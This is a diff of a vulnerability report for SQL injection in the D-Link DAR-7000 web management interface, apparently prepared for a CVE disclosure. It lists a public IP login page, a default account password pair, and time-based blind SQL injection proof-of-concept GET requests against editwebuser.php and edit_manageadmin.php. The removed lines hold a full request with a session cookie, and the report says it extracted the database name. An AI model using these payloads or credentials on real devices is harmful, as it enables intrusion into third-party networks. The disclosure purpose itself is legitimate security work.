@@ -4,13 +4,14 @@ official： http://www.dlink.com.cn/
 
 version:DAR-7000
 
- Vulnerability Path  ：/sysmanage/edit_manageadmin.php
+ Vulnerability Path  ：/useratte/editwebuser.php![image](https://github.com/flyyue2001/cve/assets/88701694/09f7da57-6915-4334-bdc6-71f3016df44f)
+
 
 See the login page.
 
 https://60.22.74.195:8443/
 
-![image-20230902145448739](/Users/yuelingfeng/Library/Application Support/typora-user-images/image-20230902145448739.png)
+<img width="730" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/96abc24b-20b8-41be-94ab-93f545830440">
 
 
 
@@ -18,7 +19,7 @@ There is a default account password present： test/admin@123
 
 
 
-![image-20230902145527083](/Users/yuelingfeng/Library/Application Support/typora-user-images/image-20230902145527083.png)
+<img width="725" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/9563a5dc-605b-4b80-af22-54c28f4cdc10">
 
 
 
@@ -28,26 +29,16 @@ There is a default account password present： test/admin@123
 
 POC：
 
-GET /sysmanage/edit_manageadmin.php?id=(select*from(select+if(length(database())=3,sleep(3),1))a) HTTP/1.1
+GET /useratte/editwebuser.php?id=(select*from(select(sleep(3)))a) HTTP/1.1
+![image](https://github.com/flyyue2001/cve/assets/88701694/a280a5d4-1606-4dcb-b040-cd5d914d68e8)
 
-Host: 
 
-Cookie: PHPSESSID=bd56bd0c40b63f91db30ee598e93060b
+<img width="723" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/264c217c-38c8-4b8b-a304-0fe4f512e02a">
 
-Accept: text/html, application/xhtml+xml, image/jxr, */*
-
-Accept-Language: zh-CN
-
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
-
-Accept-Encoding: gzip, deflate
-
-Connection: close
-
-![image-20230905164840007](/Users/yuelingfeng/Library/Application Support/typora-user-images/image-20230905164840007.png)
 
  By analogy, obtain the database name nsg    
 
-![image-20230905164854043](/Users/yuelingfeng/Library/Application Support/typora-user-images/image-20230905164854043.png)
+<img width="726" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/a0b78d24-c3e9-4985-a634-feb2ed714c7d">
+
 
  
